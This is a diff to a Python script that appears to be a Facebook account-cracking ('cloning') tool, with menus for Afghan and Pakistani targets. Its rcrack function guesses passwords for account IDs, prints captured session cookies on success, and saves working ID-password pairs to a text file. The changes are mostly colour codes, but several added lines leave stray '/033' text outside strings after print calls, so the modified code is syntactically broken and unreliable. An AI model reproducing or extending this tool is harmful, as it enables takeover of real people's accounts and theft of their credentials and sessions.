@@ -167,7 +167,7 @@ logo=("""
 ┃╰━╯┃┃╱┃┃╰━━┫╰━━┫┃╱┃┃╭╮╰╯┃
 ┃╭━╮┃╰━╯┣━━╮┣━━╮┃╰━╯┃┃╰╮┃┃
 ┃┃╱┃┃╭━╮┃╰━╯┃╰━╯┃╭━╮┃┃╱┃┃┃
-╰╯╱╰┻╯╱╰┻━━━┻━━━┻╯╱╰┻╯╱╰━╯/033[1;32m
+╰╯╱╰┻╯╱╰┻━━━┻━━━┻╯╱╰┻╯╱╰━╯                                                                  /033[1;32m
                                                                                      
 █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 █   Github   : https://github.com/HassanKarimi630
@@ -175,11 +175,11 @@ logo=("""
 █  Modifier :  Hassan Karimi 
 █  Team     :  H-Tech
 █  version  : 1.14
-█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█/033[1;36m""")
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ /033[1;36m""")
 		
 
 def lines():
-	print(f'\033[0;95m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0;38m') 
+	print(f'\033[0;95m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0;33m') 
  
 loop = 0
 oks = []
@@ -204,7 +204,7 @@ def dynamic(text):
 def barie():
     os.system('clear')
     print(logo)
-    print(' [1] follow Facebook) \33[1;32m(DUMP)\33[1;37m')
+    print(' [1] follow Facebook) \33[1;32m(DUMP)\33[1;33m')
     print(' [2] RONDOM CLONING')
     print(' [0] EXIT')
     lines()
@@ -220,9 +220,9 @@ def barie():
 def riaz():
 	os.system('clear')
 	print(logo)
-	print('[1] AFGHAN CLONING')
-	print('[2] PAKISTAN CLONING')
-	print('[3] FOLLOW MY Facebook')
+	print('[1] AFGHAN CLONING')  /033[1;32m
+	print('[2] PAKISTAN CLONING') /033[1;36m
+	print('[3] FOLLOW MY Facebook') /033[1;35m
 	print('[0]\x1b[1;91m EXIT ')
 	lines()
 	riaz1 = input('[•] SELECT OPTION : ')
@@ -242,9 +242,9 @@ def riaz():
 def annu():
     os.system('clear')
     print(logo)
-    print('[1] METHOD_1✓')
-    print('[2] METHOD_2✓')
-    print('[3] METHOD_3✓')
+    print('[1] METHOD_1✓') /033[1;32m
+    print('[2] METHOD_2✓') /033[1;31m
+    print('[3] METHOD_3✓') /033[1;32m
     print('[4] \x1b[1;91mBACK MENU ')
     lines()
     riaz1 = input('[+] CHOOSE OPTION : ')
@@ -257,12 +257,12 @@ def annu():
     if riaz1 =='4':
     	riaz()
     else:
-        print('\n\033[1;37m[+] SELECT VALID OPTION \033[0;97m')      
+        print('\n\033[1;32m[+] SELECT VALID OPTION \033[0;97m')      
   
 def bangla():
 	os.system('clear')
 	print(logo)
-	print('[1] PAK CRACK _M 1')
+	print('[1] PAK CRACK _M 1')  /033[1;32m
 	print('[2] PAK CRACK _M 2')
 	print('[3]\x1b[1;91m BACK MENU')
 	lines()
@@ -332,7 +332,7 @@ def m2():
         print(logo)
         tl = str(len(user))
         print(' TOTAL ACOUNTS : '+tl)
-        print(' SELECTED CODE :\x1b[1;92m '+kode)
+        print(' SELECTED CODE :\x1b[1;33m '+kode)
         print('\x1b[1;92m USE FLIGHT MODE FOR SPEED UP')
         lines()
         for guru in user:
@@ -503,7 +503,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[Hassan✓-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
+                print('\033[1;32m[Hassan✓-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                 open('Hassan -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(uid)
                 break
